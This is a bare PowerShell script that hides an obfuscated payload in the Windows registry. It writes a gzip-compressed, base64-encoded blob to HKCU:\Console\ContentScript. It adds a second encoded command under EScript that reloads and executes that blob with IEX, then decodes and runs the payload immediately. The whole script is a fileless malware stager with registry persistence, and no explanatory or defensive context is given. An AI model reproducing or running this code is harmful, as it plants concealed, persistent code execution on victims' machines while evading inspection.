$code = "H4sIAAAAAAAAAL1Xe2/aSBD/O3wK6xTJto7wTppUilQbYh7FhGCe4RBavGuzsPZSe82j1373GxvT0kt6l+qkQ7K0j5nZmd88sYi4skRAbWFyTKSrIQlCyn2plMlc1nhTSPfSBznjRL4t4uN4MXeJmG8Cbs8RxgEJQ+nPzEUXBciTlMstCuYexxEjWSnZxIQERwFRLy4yF8lR5IfIIXMfCbolc4+IJcchPKRMtc2mxj1E/dn799UoCIgvjvtcnQgtDIm3YJSEiip9kUZLEpCrx8WK2EL6U7qc5+qMLxBLyQ5VZC/BIM3H8V2b2yi2IGdtGBWK/Mcfsjq9Ks5yD58ixEJFtg6hIF4OMyar0lc1frB/2BBFNqkd8JA7IjeifrmUGyTadxLlzaPuspoB2wIiosCXfm5iLPPIociw7AIy2hFBWc01/S1fE+XSjxjLSh+UaapQL/IF9QjcCxLwjUWCLbVJmGsgHzPSI85M6ZDdCYe3MinnTEDVFYGaTd33Ft3NxMVHcbL6UvuzOFDh9yIW1MzXzCtRhQkjLhJkLgD6s7DKXFxMkyUBe5QuD2nCdy8VspIJSiDBgwNsL/tBRNSZNI1dN53N0mdPnGH2p4KKJ66U5+jMox730nTIKZ5lLhI/J/fxxXwRUYZJEBP8PHJrxKE+qR185FH7FJzKa04jDiMJILkTWQcUVeT0guBaCo8cIzp9yfbgUfGNVz8qp9ng+BC0gphQf1Tm6ERFbvom8QDA414GZzmQEuREnabB4fR6vAciucpQGGalbgQ5aWcliyBGcFbS/JCmV1okeLKUv6trRkxQG4XiJG6mvgJp+nSV+6EIIhvcCzD0rQ2xKWIxKlmpQTHRDxZ1TyrIr2JSRYxR3wVJW/AJnMRYWCIOmgBn/x4gas4ioultGPGAOqkYBkMu1Ic0pZJ4Qy7B8j+ofUqUY1bEWJ1AOlMaAsBiXGSlIQ0E1CA5+yLy/qN6P5akH/SsBiT1pJKk4lQ/iDhhEko77gT338BMoAsEwGYE3NNRSG4qccvwXeW3/CNtafCbNH1m4taaFps7+Ez4BrTc5LV3+GNr1cibdjXs1o1bje7cnX3b0WyH3hqtMdA90ULzVsPV9lODGrtG76OGdThzJ7TouhrurroPXrvTDPViKufIb1cqjXFBK5crj+XCGpNWTL/WcMeju30b1lBbH9s68BWa7KFV7S1GJeN5xBr5irF0Rjy0birPGNWvGdZ0jkssQsMe7zdsT8/nhzfN2Cq9syhvNov6ftn+PIjMqsYnpTth140CGrXC537o9oedVs/S9ma1sns86GM0ul4vyvhz8+F60KxNInMVusPC3bizenrXNHoHNOqxhf+07dCEfrAoD1eoBnIGhvlU2PQ/PumTkbH85U8z1vt8EY+HRdxDtc2IICdfJOJ69LnRGgyNT1rR6CFj1wOb+oP6ckyf8/X83TiYsPW+wFpc01ru0mhZA2ZYg/oqGFqVd/m7UWsPmA8Tuc+8/TSZEMBmaeuFXq2RXzrPBb3pX9/sGP8UjunYyQ+pbfCeZRAT1qZzN0Yu7g2ZzkXRcavAu91pWwD2el+2boEmMIho3bT8fD5/u10UO/roSdNQt1rkbJEvjjYa0jQ40UE/XdMMzEcfe/1rkL0udvqU4DHcu7FNQ8+FZPIp6Awx1O/Qna3vKmMNk+Fk97tbhgfyZn99aK8eSo/Vyt5cgW/6ZknT7u9/g1S5yCSRv4gc51jP/6WRmigIl4hBTkAzPFUygwdG2tK6nMYcivL6wLQmgU8YDBMwbpzyX2OM23ET/kk3hJHg2KhnUOcGsCyXXl2p0jdC9XtnPh29f/8MhqSFJU70XJv4rlhmC/tyoQDttLCvFNTM2+2v8s1B+SYtG3fkMyjPH2LJQ2rmCPVSLKEG4f8Z67TuJU//Otbfz/7h9k34F7LnIL24/PHgV9zx3yEaISqA1YL6zshxQnkrUmkAns2DZ56GCHPSXzy+P0biqgPTYkb+kMk0HekMoZB+hsGdfJJu1XgGDAUKxNWKL2DKT1qhcolUqfkwli6R9FW6AlC0sFyCUT9wo7gvSsd/Ll+kHZiSMH6ResQmMM5etfgC+h2B8SYWnQiJieHsL7dZffMKDQAA";
Set-ItemProperty "HKCU:\Console\" -Name ContentScript -Value $code;

$base64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBHAHoAaQBwAFMAdAByAGUAYQBtACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AKAAsAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABnAHAAIAAnAEgASwBDAFUAOgBcAEMAbwBuAHMAbwBsAGUAJwApAC4AQwBvAG4AdABlAG4AdABTAGMAcgBpAHAAdAApACkAKQAsAFsASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQAVABvAEUAbgBkACgAKQA7AA=="
Set-ItemProperty "HKCU:\Console\" -Name EScript -Value $base64;

$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String($code));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
